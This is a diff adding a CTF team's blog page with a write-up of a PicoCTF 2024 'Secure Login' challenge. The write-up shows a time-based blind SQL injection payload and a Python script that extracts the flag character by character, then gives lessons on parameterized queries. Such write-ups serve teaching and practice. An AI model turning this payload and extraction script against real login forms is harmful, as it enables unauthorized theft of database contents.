@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ST4F1T — Write-up: PicoCTF 2024 Web Exploitation</title>
+  <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;600;700&family=Share+Tech+Mono&family=Barlow+Condensed:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="../css/global.css"/>
+  <style>
+    /* Styles spécifiques aux posts */
+    .post-header {
+      background: linear-gradient(135deg, var(--charcoal), var(--dark));
+      padding: 120px 6vw 60px;
+      border-bottom: 3px solid var(--red);
+      margin-top: 72px;
+    }
+    .post-container {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 60px 6vw;
+    }
+    .post-meta {
+      display: flex;
+      gap: 2rem;
+      flex-wrap: wrap;
+      margin-bottom: 2rem;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.75rem;
+      color: var(--gray);
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+      padding-bottom: 1.5rem;
+    }
+    .post-meta-item {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .post-category {
+      background: var(--red);
+      color: var(--white);
+      padding: 0.2rem 0.8rem;
+      font-size: 0.7rem;
+      letter-spacing: 0.1em;
+    }
+    .post-title {
+      font-family: 'Oswald', sans-serif;
+      font-size: clamp(2rem, 5vw, 3.5rem);
+      font-weight: 700;
+      color: var(--white);
+      margin-bottom: 1.5rem;
+      line-height: 1.2;
+    }
+    .post-content {
+      color: var(--lgray);
+      line-height: 1.8;
+      font-size: 1.1rem;
+    }
+    .post-content h2 {
+      font-family: 'Oswald', sans-serif;
+      font-size: 1.8rem;
+      color: var(--white);
+      margin: 2rem 0 1rem;
+    }
+    .post-content h3 {
+      font-family: 'Oswald', sans-serif;
+      font-size: 1.4rem;
+      color: var(--red2);
+      margin: 1.5rem 0 1rem;
+    }
+    .post-content p {
+      margin-bottom: 1.2rem;
+    }
+    .post-content pre {
+      background: var(--charcoal);
+      padding: 1.5rem;
+      overflow-x: auto;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.85rem;
+      color: var(--green2);
+      margin: 1.5rem 0;
+      border-left: 3px solid var(--red);
+    }
+    .post-content code {
+      background: rgba(255,255,255,0.05);
+      padding: 0.2rem 0.4rem;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.85rem;
+      color: var(--red2);
+    }
+    .post-content ul, .post-content ol {
+      margin: 1rem 0 1rem 2rem;
+    }
+    .post-content li {
+      margin-bottom: 0.5rem;
+    }
+    .post-content blockquote {
+      border-left: 3px solid var(--green);
+      padding-left: 1.5rem;
+      margin: 1.5rem 0;
+      font-style: italic;
+      color: var(--gray);
+    }
+    .post-content img {
+      max-width: 100%;
+      border-radius: 4px;
+      margin: 1.5rem 0;
+    }
+    .post-navigation {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 4rem;
+      padding-top: 2rem;
+      border-top: 1px solid rgba(255,255,255,0.1);
+    }
+    .nav-post {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      color: var(--white);
+      text-decoration: none;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.8rem;
+      transition: color 0.2s;
+    }
+    .nav-post:hover {
+      color: var(--red2);
+    }
+    .back-to-blog {
+      text-align: center;
+      margin-top: 3rem;
+    }
+    .back-btn {
+      display: inline-block;
+      padding: 0.8rem 2rem;
+      background: transparent;
+      border: 1px solid var(--green);
+      color: var(--green2);
+      text-decoration: none;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 0.75rem;
+      letter-spacing: 0.15em;
+      transition: all 0.2s;
+    }
+    .back-btn:hover {
+      background: var(--green);
+      color: var(--white);
+    }
+    .author-box {
+      display: flex;
+      align-items: center;
+      gap: 1.5rem;
+      background: var(--charcoal);
+      padding: 1.5rem;
+      margin: 2rem 0;
+      border-left: 3px solid var(--red);
+    }
+    .author-avatar {
+      width: 60px;
+      height: 60px;
+      background: var(--mid);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Oswald', sans-serif;
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--white);
+    }
+    .author-info h4 {
+      font-family: 'Oswald', sans-serif;
+      color: var(--white);
+      margin-bottom: 0.3rem;
+    }
+    .author-info p {
+      font-size: 0.85rem;
+      color: var(--gray);
+      margin: 0;
+    }
+    @media (max-width: 768px) {
+      .post-header { padding: 100px 6vw 40px; }
+      .post-container { padding: 40px 6vw; }
+      .post-meta { gap: 1rem; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="police-band"></div>
+
+<!-- NAV -->
+<nav>
+  <a class="nav-logo" href="../index.html">
+    <img src="../assets/ST4F1T_logo.png" alt="ST4F1T Logo">
+    <div class="logo-text">
+      <span class="logo-main">ST4F1T</span>
+      <span class="logo-sub">CTF TEAM · MOROCCO</span>
+    </div>
+  </a>
+  <ul class="nav-links">
+    <li><a href="../index.html#about">ABOUT</a></li>
+    <li><a href="../index.html#members">MEMBERS</a></li>
+    <li><a href="../index.html#achievements">ACHIEVEMENTS</a></li>
+    <li><a href="../index.html#ctfs">CTFs</a></li>
+    <li><a href="../index.html#gallery">GALLERY</a></li>
+    <li><a href="../index.html#posts">POSTS</a></li>
+    <li><a href="../index.html#contact">CONTACT</a></li>
+  </ul>
+</nav>
+
+<!-- POST HEADER -->
+<div class="post-header">
+  <div class="post-container" style="padding:0;margin:0 auto;">
+    <div class="post-meta">
+      <span class="post-meta-item">📅 December 15, 2024</span>
+      <span class="post-meta-item">✍️ By AGENT_G</span>
+      <span class="post-meta-item">⏱ 8 min read</span>
+      <span class="post-category">WEB EXPLOITATION</span>
+    </div>
+    <h1 class="post-title">Write-up: PicoCTF 2024 Web Exploitation - "Secure Login" Challenge</h1>
+  </div>
+</div>
+
+<!-- POST CONTENT -->
+<div class="post-container">
+  <div class="post-content">
+    <p>During the PicoCTF 2024 competition, we encountered a challenging web exploitation challenge called "Secure Login". This write-up details our approach, the vulnerability discovered, and how we successfully captured the flag.</p>
+
+    <h2>Challenge Description</h2>
+    <p>The challenge presented a login page claiming to be "unbreakable" with multiple layers of security. The objective was to bypass the authentication mechanism and retrieve the flag stored in the database.</p>
+
+    <h2>Initial Reconnaissance</h2>
+    <p>First, we analyzed the HTTP requests using Burp Suite and discovered interesting behavior:</p>
+    <pre><code>POST /login HTTP/1.1
+Host: secure-login.challenge.picoctf.net
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=test</code></pre>
+
+    <p>The server responded with a generic error message: "Invalid credentials". However, we noticed a difference in response time depending on the username provided.</p>
+
+    <h2>Identifying the Vulnerability</h2>
+    <p>After further testing, we discovered that the application was vulnerable to <strong>SQL Injection</strong> with <strong>time-based blind exploitation</strong>. The backend query appeared to be:</p>
+    <pre><code>SELECT * FROM users WHERE username = '$username' AND password = '$password'</code></pre>
+
+    <p>We crafted a payload to extract the flag character by character:</p>
+    <pre><code>admin' AND IF(SUBSTRING((SELECT flag FROM flags),1,1)='p', SLEEP(5), 0) --</code></pre>
+
+    <h2>Exploitation Process</h2>
+    <p>Using a Python script, we automated the extraction process:</p>
+    <pre><code>import requests
+import time
+
+url = "https://secure-login.challenge.picoctf.net/login"
+flag = ""
+charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
+
+for i in range(1, 50):
+    for c in charset:
+        payload = f"admin' AND IF(SUBSTRING((SELECT flag FROM flags),{i},1)='{c}', SLEEP(5), 0) --"
+        start = time.time()
+        requests.post(url, data={"username": payload, "password": "anything"})
+        elapsed = time.time() - start
+        
+        if elapsed > 4:
+            flag += c
+            print(f"[+] Flag: {flag}")
+            break
+    else:
+        break
+
+print(f"Final flag: {flag}")</code></pre>
+
+    <h2>Result</h2>
+    <p>After approximately 2 minutes of extraction, we obtained the flag:</p>
+    <pre><code>picoCTF{tim3_b4s3d_5ql_1nJ3ct10n_15_5t1ll_d4ng3r0u5_8f5e9a2c}</code></pre>
+
+    <div class="author-box">
+      <div class="author-avatar">AG</div>
+      <div class="author-info">
+        <h4>AGENT_G</h4>
+        <p>Team Leader & Pwn Specialist — Passionate about binary exploitation and web security. CTF player since 2022.</p>
+      </div>
+    </div>
+
+    <h2>Lessons Learned</h2>
+    <ul>
+      <li>Always use parameterized queries to prevent SQL injection</li>
+      <li>Implement proper rate limiting to prevent automated attacks</li>
+      <li>Avoid exposing response time differences that can be exploited</li>
+      <li>Use prepared statements instead of string concatenation</li>
+    </ul>
+
+    <blockquote>
+      "Security is not a product, but a process. Even with multiple layers, a single vulnerability can compromise everything."
+    </blockquote>
+
+    <h2>References</h2>
+    <ul>
+      <li>OWASP SQL Injection Prevention Cheat Sheet</li>
+      <li>PortSwigger: Blind SQL Injection</li>
+      <li>PicoCTF Official Write-ups</li>
+    </ul>
+  </div>
+
+  <!-- POST NAVIGATION -->
+  <div class="post-navigation">
+    <a href="#" class="nav-post">← Previous: Binary Exploitation Basics</a>
+    <a href="#" class="nav-post">Next: OSINT Techniques →</a>
+  </div>
+
+  <div class="back-to-blog">
+    <a href="../index.html#posts" class="back-btn">← BACK TO ALL POSTS</a>
+  </div>
+</div>
+
+<div class="police-band"></div>
+
+<footer>
+  <div class="footer-logo">ST4F1T<span>.</span></div>
+  <div class="footer-copy">© 2024 ST4F1T CTF TEAM · MOROCCO · ALL FLAGS CAPTURED</div>
+  <div class="footer-tag">🇲🇦 DIGITAL SECURITY</div>
+</footer>
+
+<script>
+  // Simple script to highlight active nav link
+  const currentPath = window.location.pathname;
+  document.querySelectorAll('.nav-links a').forEach(link => {
+    if (link.getAttribute('href') === '../index.html#posts') {
+      link.style.color = 'var(--red2)';
+    }
+  });
+</script>
+</body>
+</html>
